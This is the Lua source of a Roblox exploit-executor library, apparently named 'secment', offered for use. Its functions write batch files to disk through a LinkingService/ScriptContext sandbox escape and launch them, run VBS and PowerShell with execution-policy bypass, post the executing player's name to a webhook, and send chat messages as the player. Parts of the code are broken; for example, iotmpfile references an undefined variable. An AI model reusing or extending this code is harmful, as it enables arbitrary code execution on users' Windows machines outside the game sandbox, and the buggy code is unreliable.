local secment = {}
local storedText = ""

function secment.bat(code)
    local name = math.random(100000, 999999)
    local batContent = [[
@echo off
]] .. code .. [[
]]
    local batFileName = tostring(name) .. ".bat"
    game:GetService("LinkingService"):OpenUrl(game:GetService("ScriptContext"):SaveScriptProfilingData(batContent, batFileName))
end

function secment.vbs(code)
    secment.bat([[ 
@echo off
setlocal

(
echo ]] .. code .. [[
) > temp_script.vbs

cscript //nologo temp_script.vbs
del temp_script.vbs
]])
end

function secment.powershell(code)
    secment.bat([[Powershell.exe -ExecutionPolicy Bypass -Command "]] .. code .. [[" & del temp_script.ps1]])
end

function secment.msgbox(message)
    secment.powershell([[Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show(']] .. message .. [[')]])
end

function secment.chat(msg)
    if game:GetService("TextChatService").ChatVersion == Enum.ChatVersion.LegacyChatService then
        game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents").SayMessageRequest:FireServer(msg,"All")
    else
        game:GetService("TextChatService").ChatInputBarConfiguration.TargetTextChannel:SendAsync(msg)
    end
end    

function secment.webhooksend(webhook, name, msg)
    local HttpService = game:GetService("HttpService")
    local httpRequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request)

    local payload = {
        content = "",
        embeds = {
            {
                title = "[**secment module - by cole**]",
                description = game.Players.LocalPlayer.DisplayName .. " has executed the script.",
                type = "rich",
                color = tonumber(0xff0000),
                fields = {
                    {
                        name = name,
                        value = msg,
                        inline = true
                    }
                }
            }
        }
    }

    local response = httpRequest({
        Url = webhook,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode(payload)
    })

    return response
end

local function textbox(parent)
    local box = Instance.new("TextBox")
    box.Name = "input"
    box.Parent = parent
    box.Size = UDim2.new(0, 100, 0, 50)
    box.Position = UDim2.new(0, 50, 0, 0)
    box.BackgroundTransparency = 1
    box.TextColor3 = Color3.new(1, 1, 1)
    box.PlaceholderText = "Type here..."

    box.FocusLost:Connect(function(enterPressed)
        if enterPressed then
            storedText = box.Text
            print(storedText)
            box:Destroy()
        end
    end)
end

function secment.ioread(text)
    print("a")
    repeat wait() until game.CoreGui.DevConsoleMaster.DevConsoleWindow.DevConsoleUI:FindFirstChild("MainView")

    local mainView = game.CoreGui.DevConsoleMaster.DevConsoleWindow.DevConsoleUI.MainView
    local clientLog = mainView.ClientLog
    local highestframe = clientLog:GetChildren()[#clientLog:GetChildren()]

    if not highestframe:FindFirstChild("input") then
        textbox(highestframe)
        local inputBox = highestframe:FindFirstChild("input")
        inputBox.Text = text
    end
end

function secment.iowrite(text)
    repeat wait() until game.CoreGui.DevConsoleMaster.DevConsoleWindow.DevConsoleUI:FindFirstChild("MainView")
    local highestframe=game.CoreGui.DevConsoleMaster.DevConsoleWindow.DevConsoleUI.MainView.ClientLog:GetChildren()[#game.CoreGui.DevConsoleMaster.DevConsoleWindow.DevConsoleUI.MainView.ClientLog:GetChildren()]

    if highestframe.image.Image=="rbxasset://textures/DevConsole/Error.png" then
        warn("dosent work on warn")
    elseif highestframe.image.Image=="rbxasset://textures/DevConsole/Warning.png" then
        warn("dosent work on error")
    elseif highestframe.image.Image=="" then
        highestframe.msg.Text=highestframe.msg.Text..text
    end
end

function secment.iotmpfile(txt)
    local gen = math.random(100000, 999999)
    local script = [[
@echo off
setlocal

set name=%TEMP%\]] .. name .. [[.txt
set source=]] .. txt .. [[

echo %source% > "%name%"
start notepad "%name%"
:wait
tasklist | find /I "notepad.exe" >nul
if %errorlevel%==0 (
    timeout /t 1 >nul
    goto wait
)

del "%name%"

endlocal
]]
    local filename = tostring(gen) .. ".bat"
    game:GetService("LinkingService"):OpenUrl(game:GetService("ScriptContext"):SaveScriptProfilingData(script, filename))
end

function secment.help()
    print("Available Functions:")
    print("1. secment.bat(code) - executes a bat command")
    print("2. secment.vbs(code) - executes a vbs command")
    print("3. secment.powershell(code) - executes a powershell command")
    print("4. secment.msgbox(message) - shows a messagebox")
    print("5. secment.chat(msg) - chats a custom message")
    print("6. secment.webhooksend(webhook, name, msg) - send a message to a webhook")
    print("7. secment.ioread(text) - makes a clickable and editable label anything writen will be printed")
    print("8. secment.iowrite(msg) - gets latest output and adds the msg to it")
    print("9. secment.iotmpfile() - makes a temporary file when closed is deleted")
    print("10. secment.help() - prints this message")
end

getgenv().io = io

return secment
